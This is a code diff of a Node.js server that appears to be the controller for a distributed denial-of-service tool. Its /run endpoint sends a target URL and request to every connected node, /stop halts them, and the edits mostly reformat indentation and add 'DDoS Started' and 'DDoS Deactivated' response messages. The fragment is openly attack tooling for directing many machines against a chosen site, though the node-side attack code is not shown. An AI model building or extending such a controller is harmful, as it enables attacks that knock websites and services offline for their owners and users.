@@ -22,15 +22,15 @@ var config = require('./etc/config'),
 var nodesCount = 0;
 var activeNodes = [];
 var stats = {
-		errors: 0,
-		success: 0
-	};
+        errors: 0,
+        success: 0
+    };
 
 
 var server = net.createServer(function (node) {
     var d = dnode(function(node){
-    	this.stats = function (s) {
-	        console.log("New stats report:",s);
+        this.stats = function (s) {
+            console.log("New stats report:",s);
         }
         this.ping = function (s){
             console.log("=> New ping received:" + s);
@@ -68,31 +68,32 @@ app.use('/run', function (req, res, next) {
     console.log(req.body);
 
     activeNodes.forEach(function(node){
-	    node.run(req.body.url,req.body.req);
-	});
+        node.run(req.body.url,req.body.req);
+    });
 
-	res.setHeader('Content-Type', 'application/json');
-	res.end(JSON.stringify({ activeNodes: activeNodes.length, result: 'ok' }));
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ activeNodes: activeNodes.length, result: 'ok', message: 'DDoS Started' }));
 
     next();
 });
 
 app.use('/stop', function (req, res, next) {
-	console.log("Deactivating DDoS nodes");
+    console.log("Deactivating DDoS nodes");
 
-	activeNodes.forEach(function(node){
-	    node.stop();
-	});
+    activeNodes.forEach(function(node){
+        node.stop();
+    });
 
-	res.setHeader('Content-Type', 'application/json');
-	res.end(JSON.stringify({ result: 'ok' }));
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ result: 'ok', message: 'DDoS Deactivated' }));
 
     next();
 });
 
 app.use('/stats', function (req, res, next) {
-	res.setHeader('Content-Type', 'application/json');
-	res.end(JSON.stringify({ activeNodes: activeNodes.length }));
+    // TODO: Send aggragated stats from all nodes
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ activeNodes: activeNodes.length }));
     next();
 });
 
